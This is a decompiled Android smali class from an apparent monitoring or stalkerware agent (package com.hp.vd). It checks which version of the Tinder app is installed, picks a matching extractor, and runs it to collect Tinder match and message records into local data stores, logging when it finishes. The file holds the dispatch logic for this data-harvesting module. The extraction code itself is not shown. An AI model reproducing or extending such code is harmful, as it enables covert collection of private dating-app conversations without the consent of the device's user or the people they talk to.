.class public Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;
.super Ljava/lang/Object;
.source "TinderMultiversionExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "TinderExtractor(mv)"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected tinderMatchDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TinderMatchData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected tinderMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TinderMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TinderMatchData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TinderMessageData;",
            "Ljava/lang/Integer;",
            ">;)V"
        }
    .end annotation

    .line 29
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 16
    iput-object v0, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->context:Lcom/hp/vd/context/Context;

    .line 17
    iput-object v0, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 18
    iput-object v0, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->tinderMatchDao:Lcom/j256/ormlite/dao/Dao;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->tinderMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 30
    iput-object p1, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->context:Lcom/hp/vd/context/Context;

    .line 31
    iput-object p2, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 32
    iput-object p3, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 34
    iput-object p4, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->tinderMatchDao:Lcom/j256/ormlite/dao/Dao;

    .line 35
    iput-object p5, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->tinderMessageDao:Lcom/j256/ormlite/dao/Dao;

    return-void
.end method


# virtual methods
.method protected _run()V
    .locals 9

    .line 51
    new-instance v6, Lcom/hp/vd/module/custom/tinder/v2/TinderExtractor;

    iget-object v1, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->context:Lcom/hp/vd/context/Context;

    iget-object v2, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v3, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    iget-object v4, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->tinderMatchDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->tinderMessageDao:Lcom/j256/ormlite/dao/Dao;

    move-object v0, v6

    invoke-direct/range {v0 .. v5}, Lcom/hp/vd/module/custom/tinder/v2/TinderExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;)V

    .line 53
    invoke-virtual {v6}, Lcom/hp/vd/module/custom/tinder/v2/TinderExtractor;->isCompatible()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 54
    invoke-virtual {v6}, Lcom/hp/vd/module/custom/tinder/v2/TinderExtractor;->run()V

    .line 56
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor(mv)"

    const-string v2, "extractor-v2 finished."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    goto :goto_0

    .line 59
    :cond_0
    new-instance v0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;

    iget-object v4, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->context:Lcom/hp/vd/context/Context;

    iget-object v5, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v6, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    iget-object v7, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->tinderMatchDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v8, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->tinderMessageDao:Lcom/j256/ormlite/dao/Dao;

    move-object v3, v0

    invoke-direct/range {v3 .. v8}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;)V

    .line 61
    invoke-virtual {v0}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->isCompatible()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 62
    invoke-virtual {v0}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->run()V

    .line 64
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor(mv)"

    const-string v2, "extractor-v1 finished."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_1
    :goto_0
    return-void
.end method

.method protected detectVersion()Ljava/lang/Integer;
    .locals 3

    .line 72
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const-string v1, "com.tinder"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v0

    .line 73
    iget v0, v0, Landroid/content/pm/PackageInfo;->versionCode:I

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 76
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const/4 v0, 0x0

    return-object v0
.end method

.method public run()V
    .locals 4

    .line 42
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->_run()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 45
    iget-object v1, p0, Lcom/hp/vd/module/custom/tinder/TinderMultiversionExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "TinderExtractor(mv)"

    const-string v3, "Exception caught in generic extractor"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return-void
.end method
